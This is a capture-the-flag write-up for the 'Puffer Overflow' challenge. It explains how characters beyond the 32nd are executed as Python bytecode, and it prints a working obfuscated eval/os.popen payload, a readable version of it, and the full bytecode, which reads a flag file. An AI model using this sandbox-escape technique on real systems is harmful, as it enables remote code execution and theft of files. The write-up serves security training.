# Puffer Overflow

> Let's review the code.

There's two interesting functions - put\_on\_stack, which generates some interesting python bytecode to put a value onto the stack, and returns it.

Then, there's execute bytecode. It takes some bytecode, and, well, executes it. How though?

It loads 256 constants - 1,2,3, etc. matching up to 1,2,3,etc. As global variables, it loads the functions chr, ord, globals, locals, getattr and setattr. We have to use these functions alone to gain RCE. Impossible? No. But lets look into how we can do this.

We input a name. It takes the first 32 bytes of this, and generates some byte code that puts this name onto the stack. It then prepends said bytecode to all bytes afterwards, and executes it. If we put 0-32 chars, this is fine, but if we input anymore, then from the 33th character onwards is executed as python bytecode!

We must generate python bytecode that utilises the small set of functions and variables we have to gain RCE. My final payload in python code form was globals\(\)\[chr\(101\)+chr\(118\)+chr\(97\)+chr\(108\)\]\(chr\(95\)+chr\(95\)+chr\(98\)+chr\(117\)+chr\(105\)+chr\(108\)+chr\(116\)+chr\(105\)+chr\(110\)+chr\(115\)+chr\(95\)+chr\(95\)+chr\(46\)+chr\(95\)+chr\(95\)+chr\(105\)+chr\(109\)+chr\(112\)+chr\(111\)+chr\(114\)+chr\(116\)+chr\(95\)+chr\(95\)+chr\(40\)+chr\(39\)+chr\(111\)+chr\(115\)+chr\(39\)+chr\(41\)+chr\(46\)+chr\(112\)+chr\(111\)+chr\(112\)+chr\(101\)+chr\(110\)+chr\(40\)+chr\(39\)+chr\(99\)+chr\(97\)+chr\(116\)+chr\(32\)+chr\(47\)+chr\(104\)+chr\(111\)+chr\(109\)+chr\(101\)+chr\(47\)+chr\(114\)+chr\(97\)+chr\(99\)+chr\(116\)+chr\(102\)+chr\(47\)+chr\(102\)+chr\(108\)+chr\(97\)+chr\(103\)+chr\(46\)+chr\(116\)+chr\(120\)+chr\(116\)+chr\(39\)+chr\(41\)+chr\(46\)+chr\(114\)+chr\(101\)+chr\(97\)+chr\(100\)+chr\(40\)+chr\(41\)\)

Not very readable, but in normal python code,

```python
globals()['eval']('__builtins__.__import__("os").popen("cat /home/ractf/flag.txt").read()')
```

How can we do this? We can't just go about compiling a .pyc or code using compile\(\) - those files create constants and globals to suit them. We can't do this however, we must only use constants and variables given to us. We can analyse the put\_on\_stack function, and see what it does

* `b"t\x00"` - load the first global, chr. We can replace with \x02 to load the 3rd global, globals
* `b"d<number>"` - load constant for argument. When doing globals\(\), we don't need this.
* `b"\x83\x01"` - call current function with 1 argument
* `b"\x17\x00"` - binary add. does first value on stack + second value. note it's called binary but it can be used to concatenate strings just like adding numbers bcoz its python at the end of the day

we can use this to generate bytecode to call globals, `b"t\x02\x83\x00"`. Then, we must dynamically construct the word "eval" using only chr via the same methods the put\_on\_stack function uses. After that, we use the BINARY\_SUBSCR opcode, b"\x19\x00", which computes TOP1 = TOP1\[TOP2\]

Now what? Loaded on the stack is the function eval. Now, using the same method as put\_on\_stack again, we construct our python payload that cats the flag. Finally, we wrap it all up with a b"\x83\x01" - call the function eval, loaded from globals\(\)\['eval'\], with one argument.

I ended up doing some enumeration, and finding `flag.txt` in `/home/ractf`, then catting it.

This results in the flag ractf{Puff3rf1sh??}. I will post the final bytecode below and my generation script and final exploit script as `generator.py` and `puffer.py`.

Bytecode:

```text
t\x02\x83\x00t\x00de\x83\x01t\x00dv\x83\x01\x17\x00t\x00da\x83\x01\x17\x00t\x00dl\x83\x01\x17\x00\x19\x00t\x00d_\x83\x01t\x00d_\x83\x01\x17\x00t\x00db\x83\x01\x17\x00t\x00du\x83\x01\x17\x00t\x00di\x83\x01\x17\x00t\x00dl\x83\x01\x17\x00t\x00dt\x83\x01\x17\x00t\x00di\x83\x01\x17\x00t\x00dn\x83\x01\x17\x00t\x00ds\x83\x01\x17\x00t\x00d_\x83\x01\x17\x00t\x00d_\x83\x01\x17\x00t\x00d.\x83\x01\x17\x00t\x00d_\x83\x01\x17\x00t\x00d_\x83\x01\x17\x00t\x00di\x83\x01\x17\x00t\x00dm\x83\x01\x17\x00t\x00dp\x83\x01\x17\x00t\x00do\x83\x01\x17\x00t\x00dr\x83\x01\x17\x00t\x00dt\x83\x01\x17\x00t\x00d_\x83\x01\x17\x00t\x00d_\x83\x01\x17\x00t\x00d(\x83\x01\x17\x00t\x00d'\x83\x01\x17\x00t\x00do\x83\x01\x17\x00t\x00ds\x83\x01\x17\x00t\x00d'\x83\x01\x17\x00t\x00d)\x83\x01\x17\x00t\x00d.\x83\x01\x17\x00t\x00dp\x83\x01\x17\x00t\x00do\x83\x01\x17\x00t\x00dp\x83\x01\x17\x00t\x00de\x83\x01\x17\x00t\x00dn\x83\x01\x17\x00t\x00d(\x83\x01\x17\x00t\x00d'\x83\x01\x17\x00t\x00dc\x83\x01\x17\x00t\x00da\x83\x01\x17\x00t\x00dt\x83\x01\x17\x00t\x00d \x83\x01\x17\x00t\x00d/\x83\x01\x17\x00t\x00dh\x83\x01\x17\x00t\x00do\x83\x01\x17\x00t\x00dm\x83\x01\x17\x00t\x00de\x83\x01\x17\x00t\x00d/\x83\x01\x17\x00t\x00dr\x83\x01\x17\x00t\x00da\x83\x01\x17\x00t\x00dc\x83\x01\x17\x00t\x00dt\x83\x01\x17\x00t\x00df\x83\x01\x17\x00t\x00d/\x83\x01\x17\x00t\x00df\x83\x01\x17\x00t\x00dl\x83\x01\x17\x00t\x00da\x83\x01\x17\x00t\x00dg\x83\x01\x17\x00t\x00d.\x83\x01\x17\x00t\x00dt\x83\x01\x17\x00t\x00dx\x83\x01\x17\x00t\x00dt\x83\x01\x17\x00t\x00d'\x83\x01\x17\x00t\x00d)\x83\x01\x17\x00t\x00d.\x83\x01\x17\x00t\x00dr\x83\x01\x17\x00t\x00de\x83\x01\x17\x00t\x00da\x83\x01\x17\x00t\x00dd\x83\x01\x17\x00t\x00d(\x83\x01\x17\x00t\x00d)\x83\x01\x17\x00\x83\x01
```

## ractf{Puff3rf1sh??}

